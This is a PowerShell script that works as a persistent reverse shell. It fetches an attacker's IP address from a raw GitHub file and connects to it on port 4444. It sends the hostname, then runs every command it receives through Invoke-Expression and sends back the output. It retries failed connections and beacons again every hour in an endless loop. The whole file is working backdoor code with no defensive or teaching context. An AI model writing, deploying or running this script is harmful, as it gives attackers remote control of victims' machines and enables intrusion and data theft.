# Function to retrieve the updated IP address from a remote file (GitHub)
function Get-DynamicIPAddress {
    $githubUrl = "https://raw.githubusercontent.com/nkt420/winstf/main/hip.txt"
    try {
        # Download the file containing the IP address
        $ipAddress = Invoke-RestMethod -Uri $githubUrl -UseBasicParsing
        return $ipAddress
    } catch {
        # If the request fails, return the last known IP or a default value
        Write-Host "Failed to retrieve IP. Using fallback IP."
        return "192.168.0.100" # Fallback IP
    }
}

# Function to create a reverse shell
function Start-ReverseShell {
    param (
        [string]$ipAddress,
        [int]$port
    )

    try {
        # Simple reverse shell using TCP
        $client = New-Object System.Net.Sockets.TCPClient
        $client.Connect($ipAddress, $port)

        # Check if the connection is successful
        if ($client.Connected) {
            $stream = $client.GetStream()
            $writer = New-Object System.IO.StreamWriter($stream)
            $writer.AutoFlush = $true
            $buffer = New-Object System.Byte[] 1024

            # Send basic system information to the remote server
            $hostname = [System.Net.Dns]::GetHostName()
            $writer.WriteLine("Connected from $hostname")

            while (($bytesRead = $stream.Read($buffer, 0, $buffer.Length)) -gt 0) {
                $data = [System.Text.Encoding]::ASCII.GetString($buffer, 0, $bytesRead).Trim()

                if ($data -eq "exit") {
                    break
                }

                try {
                    $output = Invoke-Expression $data 2>&1
                    if ($output) {
                        $writer.WriteLine($output)
                    }
                } catch {
                    $writer.WriteLine("Error executing command: $_")
                }
            }

            # Close the connection after the session ends
            $client.Close()
        } else {
            throw "Connection failed to $ipAddress:$port"
        }
    } catch {
        Write-Host "Failed to connect to $ipAddress:$port. Error: $_"
    }
}

# Main function
function Main {
    # Define the port to connect to
    $port = 4444

    while ($true) {
        try {
            # Retrieve the latest IP address
            $ipAddress = Get-DynamicIPAddress
            Write-Host "Retrieved IP Address: $ipAddress"

            # Attempt to connect
            $connected = $false
            $retryAttempts = 5 # Retry 5 times if connection fails

            for ($i = 1; $i -le $retryAttempts; $i++) {
                Write-Host "Attempting connection (Attempt $i/$retryAttempts)..."
                Start-ReverseShell -ipAddress $ipAddress -port $port

                # If a successful connection was made, set $connected to true
                if ($client.Connected) {
                    $connected = $true
                    break
                } else {
                    Write-Host "Connection failed. Retrying in 30 seconds..."
                    Start-Sleep -Seconds 30
                }
            }

            if (-not $connected) {
                Write-Host "Unable to connect after $retryAttempts attempts."
            }

        } catch {
            Write-Host "Error in Main loop: $_"
        }

        # Wait for an hour before checking again (3600 seconds)
        Start-Sleep -Seconds 3600
    }
}

# Execute the Main function
Main

